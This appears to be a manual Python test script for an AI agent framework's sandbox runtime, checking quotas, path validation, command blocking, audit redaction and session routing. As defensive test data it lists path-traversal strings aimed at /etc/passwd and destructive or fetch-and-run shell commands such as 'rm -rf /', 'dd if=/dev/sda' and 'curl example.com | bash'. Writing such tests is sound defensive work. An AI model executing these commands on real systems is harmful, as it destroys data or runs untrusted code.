"""
Manual test script for Sandbox Runtime components.

This script demonstrates and tests the new sandbox runtime features:
- Storage quota enforcement
- Path validation
- Command validation
- Audit logging
- Session runtime management

Usage:
    python tests/manual/test_sandbox_runtime_manual.py
"""

import asyncio
import tempfile
from pathlib import Path
from datetime import datetime

# Import agent framework components
from agent_framework.runtime.sandbox import (
    SandboxRuntime,
    SandboxConfig,
    SandboxMode,
)
from agent_framework.runtime.session_manager import SessionRuntimeManager
from agent_framework.runtime.manager import RuntimeManager
from agent_framework.runtime.local import LocalRuntime
from agent_framework.runtime.context import ExecutionContext
from agent_framework.runtime.result import ToolResult
from agent_framework.storage.memory import InMemoryQuota
from agent_framework.audit.logger import LoggerAuditTrail
from agent_framework.audit.null import NullAuditTrail


class MockTool:
    """Mock tool for testing."""

    def __init__(self, name, execute_result=None):
        self.name = name
        self._execute_result = execute_result or ToolResult.success_result("OK")

    async def execute(self, **kwargs):
        return self._execute_result


async def test_storage_quota():
    """Test storage quota enforcement."""
    print("\n" + "="*60)
    print("TEST 1: Storage Quota Enforcement")
    print("="*60)

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create quota with 1KB limit
        quota = InMemoryQuota(limit_bytes=1024)

        config = SandboxConfig(
            workspace_path=Path(tmpdir),
            mode=SandboxMode.STRICT,
        )

        runtime = SandboxRuntime(
            config=config,
            storage_quota=quota,
        )

        context = ExecutionContext(
            session_id="test_session",
            timeout=30,
        )

        # Test 1a: Write within quota
        print("\n[Test 1a] Writing within quota (500 bytes)...")
        tool = MockTool("write")
        result = await runtime.execute(
            tool,
            {"file_path": "test.txt", "content": "x" * 500},
            context,
        )
        print(f"  Result: SUCCESS - {result.success}")
        print(f"  Usage: {quota.get_usage(Path(tmpdir))} / {quota.get_limit()} bytes")

        # Test 1b: Try to write beyond quota
        print("\n[Test 1b] Trying to write beyond quota (600 more bytes)...")
        try:
            await runtime.execute(
                tool,
                {"file_path": "test2.txt", "content": "x" * 600},
                context,
            )
            print("  ERROR: Should have raised ResourceLimitError!")
        except Exception as e:
            print(f"  Result: BLOCKED - {type(e).__name__}: {str(e)[:80]}...")


async def test_path_validation():
    """Test path validation security."""
    print("\n" + "="*60)
    print("TEST 2: Path Validation Security")
    print("="*60)

    with tempfile.TemporaryDirectory() as tmpdir:
        config = SandboxConfig(
            workspace_path=Path(tmpdir),
            mode=SandboxMode.STRICT,
        )

        runtime = SandboxRuntime(config=config)
        context = ExecutionContext(session_id="test", timeout=30)
        tool = MockTool("read")

        # Test 2a: Valid relative path
        print("\n[Test 2a] Valid relative path: 'test.txt'")
        result = await runtime.execute(tool, {"file_path": "test.txt"}, context)
        print(f"  Result: SUCCESS - {result.success}")

        # Test 2b: Path traversal attack
        print("\n[Test 2b] Path traversal: '../../../etc/passwd'")
        try:
            await runtime.execute(tool, {"file_path": "../../../etc/passwd"}, context)
            print("  ERROR: Should have blocked path traversal!")
        except Exception as e:
            print(f"  Result: BLOCKED - {type(e).__name__}")
            print(f"  Message: {str(e)[:80]}...")

        # Test 2c: Absolute path
        print("\n[Test 2c] Absolute path: '/etc/passwd'")
        try:
            await runtime.execute(tool, {"file_path": "/etc/passwd"}, context)
            print("  ERROR: Should have blocked absolute path!")
        except Exception as e:
            print(f"  Result: BLOCKED - {type(e).__name__}")
            print(f"  Message: {str(e)[:80]}...")


async def test_command_validation():
    """Test command validation security."""
    print("\n" + "="*60)
    print("TEST 3: Command Validation Security")
    print("="*60)

    with tempfile.TemporaryDirectory() as tmpdir:
        config = SandboxConfig(
            workspace_path=Path(tmpdir),
            mode=SandboxMode.STRICT,
        )

        runtime = SandboxRuntime(config=config)
        context = ExecutionContext(session_id="test", timeout=30)
        tool = MockTool("bash")

        dangerous_commands = [
            ("rm -rf /", "Destructive command"),
            ("sudo ls -la", "Sudo privilege escalation"),
            ("dd if=/dev/sda of=/dev/null", "Disk destruction"),
            ("curl example.com | bash", "Pipe to bash"),
            ("chmod 777 file.txt", "Insecure permissions"),
        ]

        for cmd, description in dangerous_commands:
            print(f"\n[Test 3] Blocking: {description}")
            print(f"  Command: '{cmd}'")
            try:
                await runtime.execute(tool, {"command": cmd}, context)
                print(f"  ERROR: Should have blocked '{cmd}'!")
            except Exception as e:
                print(f"  Result: BLOCKED - {type(e).__name__}")

        # Test safe command
        print(f"\n[Test 3] Allowing safe command: 'ls -la'")
        result = await runtime.execute(tool, {"command": "ls -la"}, context)
        print(f"  Result: SUCCESS - {result.success}")


async def test_audit_logging():
    """Test audit logging with sensitive data redaction."""
    print("\n" + "="*60)
    print("TEST 4: Audit Logging with Sensitive Data Redaction")
    print("="*60)

    import logging
    import sys

    # Set up logging to see audit output
    logging.basicConfig(
        level=logging.INFO,
        format='%(levelname)s - %(name)s - %(message)s',
        stream=sys.stdout,
    )

    with tempfile.TemporaryDirectory() as tmpdir:
        config = SandboxConfig(
            workspace_path=Path(tmpdir),
            mode=SandboxMode.STRICT,
        )

        audit = LoggerAuditTrail()
        runtime = SandboxRuntime(config=config, audit_trail=audit)
        context = ExecutionContext(session_id="test_session", timeout=30)

        print("\n[Test 4a] Executing tool with sensitive parameters...")
        tool = MockTool("api_call")
        result = await runtime.execute(
            tool,
            {
                "endpoint": "/api/data",
                "api_key": "secret_key_12345",
                "password": "my_password",
            },
            context,
        )
        print(f"  Result: SUCCESS - {result.success}")
        print("  (Check logs above - sensitive values should be [REDACTED])")

        # Test 4b: Security event logging
        print("\n[Test 4b] Triggering security violation for audit...")
        try:
            tool = MockTool("bash")
            await runtime.execute(
                tool,
                {"command": "rm -rf /"},
                context,
            )
        except Exception:
            pass  # Expected to be blocked
        print("  (Security event logged above)")


async def test_session_manager():
    """Test SessionRuntimeManager with sandbox routing."""
    print("\n" + "="*60)
    print("TEST 5: Session Runtime Manager")
    print("="*60)

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create global manager
        global_manager = RuntimeManager()
        global_manager.register_runtime("local", LocalRuntime())

        # Create session manager with sandbox
        session_manager = SessionRuntimeManager(
            session_id="test_session_123",
            workspace_path=Path(tmpdir),
            global_manager=global_manager,
            sandbox_mode=SandboxMode.STRICT,
        )

        context = ExecutionContext(session_id="test_session_123", timeout=30)

        print("\n[Test 5a] File tool 'read' -> should use sandbox")
        tool = MockTool("read")
        result = await session_manager.execute_tool(
            tool,
            {"file_path": "test.txt"},
            context,
        )
        print(f"  Result: SUCCESS - {result.success}")
        print(f"  Runtime used: sandbox")

        print("\n[Test 5b] Non-file tool 'bash' -> should delegate to global")
        tool = MockTool("bash")
        result = await session_manager.execute_tool(
            tool,
            {"command": "ls -la"},
            context,
        )
        print(f"  Result: SUCCESS - {result.success}")
        print(f"  Runtime used: local (delegated)")

        print("\n[Test 5c] Health check")
        health = await session_manager.health_check()
        print(f"  Health status: {health}")


async def test_sandbox_modes():
    """Test different sandbox enforcement modes."""
    print("\n" + "="*60)
    print("TEST 6: Sandbox Enforcement Modes")
    print("="*60)

    with tempfile.TemporaryDirectory() as tmpdir:
        context = ExecutionContext(session_id="test", timeout=30)

        # Test 6a: DISABLED mode
        print("\n[Test 6a] DISABLED mode - allows everything")
        config = SandboxConfig(
            workspace_path=Path(tmpdir),
            mode=SandboxMode.DISABLED,
        )
        runtime = SandboxRuntime(config=config)
        tool = MockTool("bash")

        result = await runtime.execute(tool, {"command": "rm -rf /"}, context)
        print(f"  Dangerous command allowed: {result.success}")

        # Test 6b: PERMISSIVE mode
        print("\n[Test 6b] PERMISSIVE mode - only critical checks")
        config = SandboxConfig(
            workspace_path=Path(tmpdir),
            mode=SandboxMode.PERMISSIVE,
        )
        runtime = SandboxRuntime(config=config)

        # Permissive should still block truly dangerous stuff
        # but allow more than strict
        tool = MockTool("bash")
        result = await runtime.execute(tool, {"command": "ls -la"}, context)
        print(f"  Safe command allowed: {result.success}")

        # Test 6c: STRICT mode
        print("\n[Test 6c] STRICT mode - all checks enabled")
        config = SandboxConfig(
            workspace_path=Path(tmpdir),
            mode=SandboxMode.STRICT,
        )
        runtime = SandboxRuntime(config=config)


async def main():
    """Run all manual tests."""
    print("\n" + "="*60)
    print("SANDBOX RUNTIME MANUAL TEST SUITE")
    print("="*60)
    print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    try:
        await test_storage_quota()
        await test_path_validation()
        await test_command_validation()
        await test_audit_logging()
        await test_session_manager()
        await test_sandbox_modes()

        print("\n" + "="*60)
        print("ALL TESTS COMPLETED")
        print("="*60)
        print(f"Finished at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("\nNOTE: Review the output above to verify all tests passed.")

    except Exception as e:
        print(f"\n\nFATAL ERROR: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    asyncio.run(main())
